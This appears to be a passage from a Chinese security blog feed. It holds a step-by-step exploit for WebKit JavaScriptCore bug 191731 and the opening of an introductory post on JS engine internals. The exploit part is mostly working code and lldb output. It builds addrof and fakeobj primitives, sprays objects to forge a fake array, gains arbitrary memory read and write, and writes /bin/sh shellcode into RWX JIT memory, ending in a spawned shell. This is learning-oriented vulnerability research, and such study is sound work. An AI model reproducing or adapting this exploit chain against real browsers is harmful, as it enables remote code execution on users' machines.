0x00000000badbeef00x10000fe6d8: 0x00000000badbeef0 0x00000000badbeef00x10000fe6e8: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>关于JIT的优化流程和内部细节可以看官方文档的描述：<a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">Introducing the webkit ftl-jit</a></p><p>文档中有描述一个函数被调用多少次会触发DFG，</p><blockquote><p>The first execution of any function always starts in the interpreter tier. As soon as any statement in the function executes more than 100 times, or the function is called more than 6 times (whichever comes first), execution is diverted into code compiled by the <em>Baseline</em> JIT. This eliminates some of the interpreter’s overhead but lacks any serious compiler optimizations. Once any statement executes more than 1000 times in <em>Baseline</em> code, or the <em>Baseline</em> function is invoked more than 66 times, we divert execution again, to the DFG JIT.</p></blockquote><p>但是我实际测试过程中我把<code>funcToJIT()</code>的调用次数调到3670，就只是有几率触发DFG，所以还是把调用次数调大一点比较稳，但也不能太大，调用次数过多就会进入FTL。</p><h3 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h3><p>POC中通过传入设定好的double值成功伪造了一个指针，其实用相反的手法我们是可以做到泄漏对象地址的。我们可以先在数组中放入对象指针，然后以double的形式将指针打印出来，构造出来的<code>addrof()</code>原语如下：</p><pre><code class="javascript">function addrof(obj){    var victim_array = [1.1];    var reg = /abc/y;    var funcToJIT = function(array){        &#39;abc&#39;.match(reg);        return array[0];    }    for(var i=0; i&lt; 10000; i++){        funcToJIT(victim_array);    }    regexLastIndex = {};    regexLastIndex.toString = function(){        victim_array[0] = obj;        return &quot;0&quot;;    };    reg.lastIndex = regexLastIndex;    return funcToJIT(victim_array)}</code></pre><p>可以观察到，我这里在<code>funcToJIT()</code>加了一个参数，因为我发现不加这个参数直接操作<code>victim_array</code>的话似乎出现了两个<code>victim_array</code>，最后返回给我的是没有修改值的那个，加上参数就可解决这个问题，原因尚不清楚。</p><p>使用这个函数并传入一个对象，就会返回这个对象的地址：</p><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.jsThere is a running process, kill it and restart?: [Y/n] yProcess 39404 launched: &#39;/Users/7o8v/Documents/SecResearch/Browser/WebKit/WebKit.git/WebKitBuild/Debug/bin/jsc&#39; (x86_64)2.1938450464e-314&gt;&gt;&gt;</code></pre><p>但是返回的是double的形式，我没找到JavaScript有啥格式化比较方便的方法，最后看niklasb大佬的exp发现可以用<code>ArrayBuffer</code>解决，代码如下：</p><pre><code class="javascript">var buffer = new ArrayBuffer(8);var u8 = new Uint8Array(buffer);var u32 = new Uint32Array(buffer);var f64 = new Float64Array(buffer);var BASE = 0x100000000;function i2f(i) {    u32[0] = i%BASE;    u32[1] = i/BASE;    return f64[0];}function f2i(f) {    f64[0] = f;    return u32[0] + BASE*u32[1];}function hex(x) {    if (x &lt; 0)        return `-${hex(-x)}`;    return `0x${x.toString(16)}`;}</code></pre><p>通过申请一个8字节的buffer，并且用不同形式表示它可以很好解决格式化的问题。</p><pre><code class="shell">&gt;&gt;&gt; test = {}[object Object]&gt;&gt;&gt; hex(f2i(addrof(test)))0x1082b00c0&gt;&gt;&gt; describe(test)Object: 0x1082b00c0 with butterfly 0x0 (Structure 0x1082f20d0:[Object, {}, NonArray, Proto:0x1082b4000]), StructureID: 76&gt;&gt;&gt;</code></pre><p>可以看到确实泄漏出了对象的地址。</p><p>根据poc再构造一个<code>fakeobj()</code>：</p><pre><code class="javascript">function fakeobj(addr){    var victim_array = [1.1];    var reg = /abc/y;    var funcToJIT = function(array){        &#39;abc&#39;.match(reg);        array[0] = addr;    }    for(var i=0; i &lt; 10000; i++){        funcToJIT(victim_array);    }    regexLastIndex = {};    regexLastIndex.toString = function(){        victim_array[0] = {};        return &quot;0&quot;;    }    reg.lastIndex = regexLastIndex;    funcToJIT(victim_array);    return victim_array[0];}</code></pre><pre><code class="shell">&gt;&gt;&gt; test = {};[object Object]&gt;&gt;&gt; test_addr = f2i(addrof(test));4440391936&gt;&gt;&gt; hex(test_addr)0x108ab0100&gt;&gt;&gt; aaaa = fakeobj(i2f(test_addr))[object Object]&gt;&gt;&gt; describe(aaaa)Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76&gt;&gt;&gt; describe(test)Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76&gt;&gt;&gt;</code></pre><p>现在可以泄漏，可以伪造，那么就要想办法扩大我们的控制范围，尽量达到任意读写的目的。</p><p>现在<code>fakeobj()</code>传入任何地址JSC都会把它当作是一个对象的指针，那么我们就可以先泄漏出一个对象的地址，再在这个对象地址的基础上加上一个偏移，使得伪造对象地址处的数据变得可控，前面提到过对象的属性会存储在butterfly中，但是当该对象不是一个数组而且属性不超过6个的时候，就不会有butterfly，而是将这些属性的值存放在对象内部连续的内存中：</p><pre><code class="shell">&gt;&gt;&gt; test = {}[object Object]&gt;&gt;&gt; test.a = 5.2900040263529e-3105.2900040263529e-310&gt;&gt;&gt; test.b = 22&gt;&gt;&gt; test.c = 33&gt;&gt;&gt; test.d = 44&gt;&gt;&gt; test.e = 55&gt;&gt;&gt; test.f = 66&gt;&gt;&gt; describe(test)Object: 0x108ab0280 with butterfly 0x0 (Structure 0x108a71260:[Object, {a:0, b:1, c:2, d:3, e:4, f:5}, NonArray, Proto:0x108ab4000, Leaf]), StructureID: 329&gt;&gt;&gt;</code></pre><p>可以看到<code>test</code>对象并没有butterfly，再来看看<code>test</code>内部：</p><pre><code class="shell">(lldb) x/10gx 0x108ab02800x108ab0280: 0x0100160000000149 0x00000000000000000x108ab0290: 0x0001616161616161 0xffff0000000000020x108ab02a0: 0xffff000000000003 0xffff0000000000040x108ab02b0: 0xffff000000000005 0xffff0000000000060x108ab02c0: 0x00000000badbeef0 0x00000000badbeef0</code></pre><p>可以看到属性的值是被编码过的，这也提醒我们伪造数据的时候要减去0x10000000000。如果我们此时再增加属性，对象就会申请butterfly来存储数据，多余的属性值就会存储到butterfly中。</p><p>现在我们就可以开始伪造对象了，如果对JavaScript对象的结构还不是很了解的，推荐阅读：<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking JavaScript Engines</a>。</p><h4 id="Fake-Object"><a href="#Fake-Object" class="headerlink" title="Fake Object"></a>Fake Object</h4><p>伪造对象需要先伪造一个header，但是header中包含一个structureID，这个值不好预测而且必须要一个有效的ID才可以。这个时候就可以使用spray技术提前创建大量的对象。structureID虽然不好预测，但也不是随机的值，而是随着对象数量的增加而变大的。所以我们提前创建大量的对象，并选取一个中间的值作为structureID，大概率就是有效的。</p><pre><code class="javascript">var spray = []for (var i = 0; i &lt; 1000; ++i) {    var obj = [1.1];    obj.a = 2.2;    obj[&#39;p&#39;+i] = 3.3;    spray.push(obj);}</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(spray[0])Object: 0x108ab4390 with butterfly 0x8000dc058 (Structure 0x108a70f50:[Array, {a:100, p0:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 322&gt;&gt;&gt; describe(spray[999])Object: 0x108a14330 with butterfly 0x8000c3e08 (Structure 0x108a10e70:[Array, {a:100, p999:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 1321&gt;&gt;&gt;</code></pre><p>伪造的时候选取一个中间的值就可以了，其实这种方法还不是太稳，比较稳的做法是使用<code>instanceof</code>，不过只是练习就无所谓啦。</p><p>再看下spray出来的obj的header：</p><pre><code class="shell">(lldb) x/2gx 0x108ab43900x108ab4390: 0x0108210700000142 0x00000008000dc058</code></pre><p>header的数据就是<code>0x0108210700000142</code>，低四字节就是structrueID，高四字节就是flags，可以直接使用，可以认为这个flags表示的就是<code>ArrayWithDouble</code>（其实还包含了其他的信息）。伪造对象如下：</p><pre><code class="javascript">u32[0] = 0x200;u32[1] = 0x01082107 - 0x10000;var header_arrayDouble = f64[0];victim = {    fake_header:header_arrayDouble,};victim_addr = f2i(addrof(victim))hax = fakeobj(i2f(victim_addr+0x10))</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(hax)Object: 0x1089c83b0 with butterfly 0x0 (Structure 0x10894a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x1089c80a0, Leaf]), StructureID: 512&gt;&gt;&gt;</code></pre><p>伪造对象成功之后，就可以进行进一步的操作了，现在可以通过<code>victim</code>控制<code>hax</code>的butterfly指向任意地址。但是现在有个问题，这个butterfly、必须是个合法的指针，然而我们是不可以通过正常方法往对象的属性写我们指定的指针的，唯一写指针进去的方法就是直接赋值一个对象。但如果对象是一个<code>ArrayWithDouble</code>，其实我们就可以通过写double的形式写一个double进去并伪造成指针，于是我们可以做以下的操作：</p><pre><code class="javascript">controller = spray[500];victim = {    fake_header:header_arrayDouble,    fake_butterfly:controller};victim_addr = f2i(addrof(victim));hax = fakeobj(i2f(victim_addr+0x10));hax[1] = 5.2900040263529e-310;</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512#查看hax的butterfly，其实也就是controller的内存(lldb) x/2gx 0x108ab62d00x108ab62d0: 0x0108210700000337 0x0000616161616161(lldb)</code></pre><p>这样我们就间接地控制了<code>controller</code>的butterfly，而且可以指向任意地址。然后通过访问<code>controller</code>的属性，我们其实已经可以实现任意地址读写了。比如访问<code>controller.a</code>其实就是读取controller的butterfly偏移为-0x10的值。现在来尝试一下读<code>hax</code>的内存：</p><pre><code class="shell">&gt;&gt;&gt; hax[1] = i2f(f2i(addrof(hax))+0x10)2.193894026e-314&gt;&gt;&gt; hex(f2i(controller.a))0x107210700000200&gt;&gt;&gt; hax[1] = i2f(f2i(addrof(hax))+0x10+8)2.19389403e-314&gt;&gt;&gt; hex(f2i(controller.a))0x7ff8000000000000&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512(lldb) x/2gx 0x108ac83b00x108ac83b0: 0x0108210700000200 0x0000000108ab62d0(lldb)</code></pre><p>可以看到虽然可以读数据了，但是读的数据并不准确，首先第一个读出来的double是解码的，这个不难理解。奇怪的是第二个，<code>hax</code>的butterfly明明被指向了<code>controller</code>，这是一个合法的对象，应该是读不出来数据的，但是这里居然也能读，虽然数据是错的。既然这个是对象，其实我们完全可以用前面写好的<code>addrof()</code>来读：</p><pre><code class="shell">&gt;&gt;&gt; hex(f2i(addrof(controller.a)))0x108ab62d0</code></pre><p>这个读出来就是准确的，用同样的方法去读double的话其实还是会有解码的情况：</p><pre><code class="shell">&gt;&gt;&gt; hex(f2i(addrof(controller.a)))0x107210700000200</code></pre><p>造成这种情况的原因主要是我前面构造的<code>addrof()</code>，它返回的值肯定是JSValue解码后的结果，所以我们可以利用现在掌握的任意读写能力重新构造更稳定可靠的<code>addrof()</code>和<code>fakeobj()</code>，构造如下：</p><pre><code class="javascript">var unboxed = [2.2];#防止unboxed成为CopyOnWriteArrayWithDouble，多赋值一次可确保ArrayWithDouble。unboxed[0] = 3.3;#boxed为ArrayWithContigousvar boxed = [{}];#使boxed和unboxed的butterfly指向同一片内存，类似ArrayBuffer，我们就可以用不同的形式表示同一块内存。hax[1] = unboxed;var shared = controller[1];hax[1] = boxed;controller[1] = shared;#由于赋值过对象，hax的类型会变成ArrayWithContigous，重新设定类型方便之后赋值。victim.fake_header = header_arrayDouble;var stage2 = {    addrof : function (obj){        boxed[0] = obj;        return f2i(unboxed[0]);    },    fakeobj : function (addr){        unboxed[0] = i2f(addr);        return boxed[0];    },    read64 : function (addr){        hax[1] = i2f(addr+0x10);        return stage2.addrof(controller.a);    },};</code></pre><p>我顺便写了负责任意读的方法<code>read64()</code>，可以试试效果：</p><pre><code class="shell">&gt;&gt;&gt; stage2.read64(stage2.addrof(hax))74345707800101380&gt;&gt;&gt; hex(74345707800101380)0x108210700000200&gt;&gt;&gt; stage2.read64(stage2.addrof(hax)+8)4440416976&gt;&gt;&gt; hex(4440416976)0x108ab62d0&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p188:101}, ArrayWithDouble, Proto:0x108ac80a0]), StructureID: 512(lldb) x/2gx 0x108ac83b00x108ac83b0: 0x0108210700000200 0x0000000108ab62d0(lldb)</code></pre><p>这就很稳了，但其实有时候读double还不是很准，我猜测是因为精度问题，但其实问题不大。现在尝试构造一个任意写的方法：</p><pre><code class="javascript">write64 : function (addr, content){        hax[1] = i2f(addr+0x10);        controller.a = this.fakeobj(content);}</code></pre><p>试试效果：</p><pre><code class="javascript">var stage2 = {    addrof : function (obj){        boxed[0] = obj;        return f2i(unboxed[0]);    },    fakeobj : function (addr){        unboxed[0] = i2f(addr);        return boxed[0];    },    read64 : function (addr){        hax[1] = i2f(addr+0x10);        return this.addrof(controller.a);    },    write64 : function (addr, content){        hax[1] = i2f(addr+0x10);        controller.a = this.fakeobj(content);    },    test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj)        value = 0x1122334455667788;        this.write64(obj_addr+8, value);    },};stage2.test();</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(testObj)Object: 0x1082b0100 with butterfly 0x1122334455667800 (Structure 0x10820d3b0:[Object, {}, NonArrayWithDouble, Proto:0x1082b4000, Leaf]), StructureID: 1333&gt;&gt;&gt;</code></pre><p>发现写进去的数据不完整，这是因为JavaScript不能表示那么大的整型，所以我选择一次写四个字节。但是测试的时候还是出了错：</p><pre><code class="javascript">    test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj);        value = 0x11223344;        this.write64(obj_addr+8, value);    },</code></pre><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.jsProcess 42272 stopped* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x11223ed8)    frame #0: 0x000000010000c145 jsc`JSC::MarkedBlock::vm(this=0x0000000011220000) const at MarkedBlock.h:472:21   469   470     inline VM* MarkedBlock::vm() const   471     {-&gt; 472         return footer().m_vm;   473     }   474   475     inline WeakSet&amp; MarkedBlock::Handle::weakSet()Target 0: (jsc) stopped.(lldb)</code></pre><p>我猜测是因为gc的检查导致的问题，所以我写了个简单的<code>passGC()</code>：</p><pre><code class="javascript">passGC : function (){        var passObj = {};        passObj[0] = 1.1;        this.write64(this.addrof(passObj+8), 0x7);},</code></pre><p>再次运行：</p><pre><code class="javascript">test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj);        this.passGC();        value = 0x11223344;        this.write64(obj_addr+8, value);},</code></pre><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.js&gt;&gt;&gt; describe(testObj)Object: 0x108ab0100 with butterfly 0x11223344 (Structure 0x108a0d420:[Object, {}, NonArrayWithDouble, Proto:0x108ab4000, Leaf]), StructureID: 1334&gt;&gt;&gt;</code></pre><p>看起来效果还不错，解决了写的问题，之后就需要考虑下写哪里的问题了，因为JIT会在内存中申请RWX的内存，所以可以构造一个JIT编译的function出来，然后找到代码的位置，将shellcode写进去，最后执行function就可以了。构造JIT Function：</p><pre><code class="javascript">getJITFunction : function (){        function target(num) {            for (var i = 2; i &lt; num; i++) {                if (num % i === 0) {                    return false;                }            }            return true;        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        return target;},</code></pre><p>查看进程的内存访问权限，可以在另一个终端输入<code>vmmap [pid]</code>：</p><pre><code class="shell">JS JIT generated code  00004e12a4201000-00004e12e4201000 [  1.0G    24K    24K    32K] rwx/rwx SM=PRV</code></pre><p>可以看到JIT的内存访问权限是RWX。</p><p>构造好了函数之后，可以通过任意读得到这块内存的地址：</p><pre><code class="javascript">getRWXMem: function(){        shellcodeFunc = this.getJITFunction()        target_addr = this.read64(this.addrof(shellcodeFunc)+8*3)        target_addr = this.read64(target_addr + 8*3)        target_addr = this.read64(target_addr + 8*4)        return [shellcodeFunc, target_addr]},</code></pre><pre><code class="shell">&gt;&gt;&gt; hex(shellcodeObj[1])0x33696e808d19(lldb) x/10i 0x33696e808d19    0x33696e808d19: 49 bb 71 e7 ff 08 01 00 00 00  movabsq $0x108ffe771, %r11        ; imm = 0x108FFE771    0x33696e808d23: 41 c6 03 00                    movb   $0x0, (%r11)    0x33696e808d27: 55                             pushq  %rbp    0x33696e808d28: 48 89 e5                       movq   %rsp, %rbp    0x33696e808d2b: 49 bb 60 e7 ff 08 01 00 00 00  movabsq $0x108ffe760, %r11        ; imm = 0x108FFE760    0x33696e808d35: 4c 89 5d 10                    movq   %r11, 0x10(%rbp)    0x33696e808d39: 8b 75 20                       movl   0x20(%rbp), %esi    0x33696e808d3c: 83 fe 02                       cmpl   $0x2, %esi    0x33696e808d3f: 0f 83 8d f8 ff ff              jae    0x33696e8085d2    0x33696e808d45: 48 89 ef                       movq   %rbp, %rdi(lldb)</code></pre><p>看汇编差不多就知道是构造出来的target函数了。构造一个写shellcode的函数：</p><pre><code class="javascript">injectShellcode : function (addr, shellcode){        var theAddr = addr;        this.passGC();        for(var i=0, len=shellcode.length; i &lt; len; i++){            this.write64(target_addr+i, shellcode[i].charCodeAt());        }},shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05&quot;;this.injectShellcode(shellcodeObj[1], shellcode);</code></pre><p>写的时候出了问题，中间可能还会触发GC，而且是在固定位置触发，所以在中间加上<code>passGC()</code>就行了。</p><pre><code class="javascript">injectShellcode : function (addr, shellcode){        var theAddr = addr;        this.passGC();        for(var i=0, len=shellcode.length; i &lt; len; i++){            if(i == 0x1f){                this.passGC();            }            this.write64(target_addr+i, shellcode[i].charCodeAt());        }}shellcodeObj = this.getRWXMem();print(hex(shellcodeObj[1]));shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05&quot;;this.injectShellcode(shellcodeObj[1], shellcode);var shellcodeFunc = shellcodeObj[0];shellcodeFunc();</code></pre><p>直接使用jsc运行脚本，就不要lldb了：</p><pre><code class="shell">$ ./WebKitBuild/Debug/bin/jsc -i ../bug_191731/test/exp.jsbash-3.2$ lsCMakeLists.txt        ChangeLog-2018-01-01    LayoutTests        ManualTests        Source            WebKit.xcworkspace    WebPlatformTestsChangeLog        Examples        Makefile        PerformanceTests    Tools            WebKitBuild        WebsitesChangeLog-2012-05-22    JSTests            Makefile.shared        ReadMe.md        WebDriverTests        WebKitLibrariesbash-3.2$bash-3.2$ exitexit</code></pre><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h3><p>[1] <a href="https://github.com/joshua7o8v/Browser/tree/master/WebKit/bug_191731" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/tree/master/WebKit/bug_191731</a></p><p>[2] <a href="https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html" target="_blank" rel="noopener">https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html</a></p><p>[3] <a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/</a></p><p>[4] <a href="https://github.com/saelo/jscpwn" target="_blank" rel="noopener">https://github.com/saelo/jscpwn</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript engine exploit 1</title>
      <link href="/2019/10/30/Javascript-engine-exploit-1/"/>
      <url>/2019/10/30/Javascript-engine-exploit-1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/183804" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183804</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>写这篇文章的目的主要是希望记录下自己学习的过程，也将自己的学习经历分享给希望学习JS引擎漏洞利用的初学者。</p><p>我刚开始学习的是JSC（JavaScriptCore），这是Safari浏览器所使用的内核WebKit的JS引擎。我选择这个目标入手的原因主要是这个比较简单，很多大佬给出的JS引擎的研究难度基本都是：</p><p>V8（Chrome）&gt; Spidermonkey（Firefox）&gt; JacaScriptCore（Safari）&gt; Chakra（Edge）</p><p>因为Chakra快被微软抛弃了，所以我还是选择了JSC。</p><h3 id="0x01-JS引擎的一些基础知识"><a href="#0x01-JS引擎的一些基础知识" class="headerlink" title="0x01 JS引擎的一些基础知识"></a>0x01 JS引擎的一些基础知识</h3><p>在学习JS引擎的漏洞利用之前，对JS引擎的一些内部运行原理做一个了解肯定是必要的。当然，也不必把所有原理都了解，由于我是通过调试特定的漏洞来进行学习（大部分初学者都是如此），所以我们只需要了解到与这个漏洞相关的一些知识就足够了。推荐去看saelo在2016年发的paper：<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking javascript engines</a></p><p>我在下面也引述文章中的部分内容。</p><h4 id="JavaScript-engine-overview"><a href="#JavaScript-engine-overview" class="headerlink" title="JavaScript engine overview"></a>JavaScript engine overview</h4><p>总体来看，JavaScript引擎包括了三个部分：</p><ul><li>一个基础的编译器，至少需要包含一个JIT（Just-in-time）。</li><li>一个JavaScript VM，用来运行JavaScript代码。</li><li>一个JavaScript Runtime，用来提供一些内置Objects和Functions。</li></ul><p>我们不需要关心编译器的内部原理，因为跟我们的漏洞利用关系不大（至少看起来关系不大），我们只需要把编译器看作一个 “输入源码，输出字节码”的黑盒就行了。</p><h4 id="The-VM-Values-and-NaN-boxing"><a href="#The-VM-Values-and-NaN-boxing" class="headerlink" title="The VM, Values, and NaN-boxing"></a>The VM, Values, and NaN-boxing</h4><p>VM通常都包含一个可以直接执行字节码的解释器。VM被实现为<code>stack-based</code>的机器（相对于<code>register-based</code>来讲），从而可以通过栈来对值进行操作。对于具体的操作码的实现可能看起来和下面一样：</p><pre><code class="c">CASE(JSOP_ADD){  MutableHandleValue lval = REGS.stackHandleAt(-2);  MutableHandleValue rval = REGS.stackHandleAt(-1);  MutableHandleValue res = REGS.stackHandleAt(-2);  if (!AddOperation(cx, lval, rval, res))    goto error;  REGS.sp--;}END_CASE(JSOP_ADD)</code></pre><p>这段代码截取自Firefox的JS引擎Spidermonkey，而JSC使用汇编实现的类似功能，看起来就没有上面这么直观。对JSC的实现感兴趣的可以去看这个文件<code>Webkit/Source/JavaScriptCore/llint/LowLevelInterpreter64.asm</code>。</p><p>通常初级JIT（first stage JIT or called baseline JIT）负责减轻一些解释器的调度开销，而高级JIT（higher stage JIT）则会做一些比较复杂的优化操作。有点类似于我们平常所使用的AOT（ahead-of-time）编译器，就比如gcc。优化型JIT（也就是前面提到的高级JIT）通常都是推测型的，意思就是它们会基于一些推测来进行优化，比如它会认为一个变量是而且一直是数字类型。当然这种推测也可能出错，当遇到出错的时候JIT就会回退到推测之前的状态。</p><p>JavaScript是动态类型语言，因此类型信息与运行时的变量有关，而不是编译时的变量。JavaScript类型系统定义了几个元类型（number, string, boolean, null, undefined, symbol）和对象（array, function）。需要注意的是JavaScript没有像其他语言一样包含‘类’的概念。取而代之的是JavaScript使用了所谓“基于原型的继承（prototype-based-inheritance）”，每个对象都有一个指向<code>prototype</code>对象的引用，这个prototype对象包含了指向它的对象的属性。</p><p>出于性能考虑（快速拷贝，适应64位的寄存器架构等），所有主流的JavaScript引擎在表示一个Value的时候都不超过八字节。一些JS引擎，比如v8，会使用<code>tagged pointers</code>来表示值，它会使用最低有效位来标识一个值是指针还是立即数。JSC和Spidermonkey则使用了另一种叫做<code>NaN-boxing</code>的概念。在<code>NaN-boxing</code>中使用了多种位模式来表示NaN（Not-a-Number），所以可以将这些位模式来编码其他的值，以下是IEEE 754的规则总结：</p><table><thead><tr><th>形式</th><th>指数</th><th>小数部分</th></tr></thead><tbody><tr><td>零</td><td>0</td><td>0</td></tr><tr><td>非规约形式</td><td>0</td><td>大于0小于1</td></tr><tr><td>规约形式</td><td>1到2^{e}-2</td><td>大于等于1小于2</td></tr><tr><td>无穷</td><td>2^{e}-1</td><td>0</td></tr><tr><td>NaN</td><td>2^{e}-1</td><td>非0</td></tr></tbody></table><p>这些多余的位模式足够用来编码整型和指针了，也因为使用了NaN-boxing，对于64位平台而言，目前只有48位用于寻址。</p><p>JSC使用的这个方案在<code>Webkit/Source/JavaScriptCore/runtime/JSCJSValue.h</code>中有很好的解释，引用如下：</p><pre><code class="c">            /*      ...      * The top 16-bits denote the type of the encoded JSValue:      *      *     Pointer {  0000:PPPP:PPPP:PPPP      *              / 0001:****:****:****      *     Double  {         ...      *              \ FFFE:****:****:****      *     Integer {  FFFF:0000:IIII:IIII      *      * The scheme we have implemented encodes double precision values by      * performing a 64-bit integer addition of the value 2^48 to the number.      * After this manipulation no encoded double-precision value will begin      * with the pattern 0x0000 or 0xFFFF. Values must be decoded by      * reversing this operation before subsequent floating point operations      * may be performed.      *      * 32-bit signed integers are marked with the 16-bit tag 0xFFFF.      *      * The tag 0x0000 denotes a pointer, or another form of tagged      * immediate. Boolean, null and undefined values are represented by      * specific, invalid pointer values:      *      *     False:     0x06      *     True:      0x07      *     Undefined: 0x0a      *     Null:      0x02      *      ...      */</code></pre><p>总结：</p><ul><li>Pointer：[0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）</li><li>Double：[0001～FFFE][xxxx:xxxx:xxxx]</li><li>Intger：[FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）</li><li>False：[0000:0000:0000:0006]</li><li>True：[0000:0000:0000:0007]</li><li>Undefined：[0000:0000:0000:000a]</li><li>Null：[0000:0000:0000:0002]</li></ul><p>有意思的是0x0不是一个合法的JSValue，它会在在引擎中导致崩溃。</p><h4 id="Objects-and-Arrays"><a href="#Objects-and-Arrays" class="headerlink" title="Objects and Arrays"></a>Objects and Arrays</h4><p>JavaScript中的对象实际上就是属性的集合，这些属性都可用（key, value）的键值对来表示。可以使用点（foo.bar）或者方括号（foo[‘bar’]）来访问属性。至少在理论上，在使用键来查找值之前都需要先将键转化为字符串的形式。</p><p>数组被描述为特殊的(“exotic”)对象，如果属性名称由32位整数来表示的话，这些属性也被称为元素。如今的大多数引擎都将这个概念扩展到了所有对象。然后，数组就是拥有<code>length</code>属性的特殊对象，它的值始终等于最高元素的索引加一。这些规定的结果就是，每个对象都具有通过字符串或者符号键访问的属性，以及通过整数索引访问的属性。</p><p>在内部，JSC将属性和元素存储在同一片内存区域中，并且在对象内部存放指向这块内存的指针。这个指针指向这片内存的中间位置，左边存放对象的属性值，右边存放对象的元素值，而在左边最近的那个内存单元存放了一个header，这个header里包含了<code>length</code>的值。这样的内存表现形式被称为<code>Butterfly</code>，在下文我们都将这种内存和指向它的指针都称为<code>Butterfly</code>，这样会使文章理解起来轻松一些。</p><pre><code class="c">--------------------------------------------------------.. | propY | propX | length | elem0 | elem1 | elem2 | ..--------------------------------------------------------                            ^                            |            +---------------+            |  +-------------+  | Some Object |  +-------------+</code></pre><p>实际上使用Butterfly来存储数据只是一个可选项（Optional），如果对象属性不多（不大于6个）而且不是数组的时候，对象的属性值将不会申请Butterfly，而是存储在对象内部，内存结构如下：</p><pre><code class="shell">object            :    objectHeader    butterfly(Null)object+0x10    :    prop_1                prop_2object+0x20    :    prop_3                prop_4object+0x30    : prop_5                prop_6</code></pre><p>虽然通常来讲，元素不需要线性地存储在内存中，但特别地：</p><pre><code class="c">a = [];a[0] = 42;a[10000] = 42;</code></pre><p>这段代码可能会导致数组以某种分散的模式来存储，这种模式会根据给定的索引额外在数组的后备存储内存中映射一个索引出来。这样的话，这个数组就不需要请求10001个元素所需要的内存了。除了不同的数组存储模式，数组也拥有不同的表现形式来表示存储的数据。举个例子，一个32位的整型数组可能会以原生形式（native form）存储来避免NaN-boxing的解包和重打包操作，这样也节约了内存。因此JSC也在<code>Webkit/Source/JavaScriptCore/runtime/IndexingType.h</code>中定义了一组不同的索引类型。最重要的部分有：</p><pre><code>    ArrayWithInt32      = IsArray | Int32Shape;    ArrayWithDouble     = IsArray | DoubleShape;    ArrayWithContiguous = IsArray | ContiguousShape;</code></pre><p>第三种存储的是JSValue，前两种存储的都是它们的原生类型。</p><p>到这里可能有读者会好奇在这种模式下，对象的属性是如何被索引到的，这点将会在后面深入讨论，简单来讲，有一种被称为<code>structure</code>的特殊元对象通过给定的属性名，将每个对象的属性映射到对应内存位置。</p><h4 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h4><p>Functions在Javascript十分重要，因此它也值得我们对它进行特别的讨论。</p><p>当执行一个函数体时，两个特殊的变量将可以访问。一个是<code>arguments</code>，它提供对参数和调用者的访问，从而使得可以创建具有参数的Function。另一个就是<code>this</code>，根据Function的调用情况，<code>this</code>可以指向不同的对象：</p><ul><li>如果调用的Function作为构造函数（ new func(…) 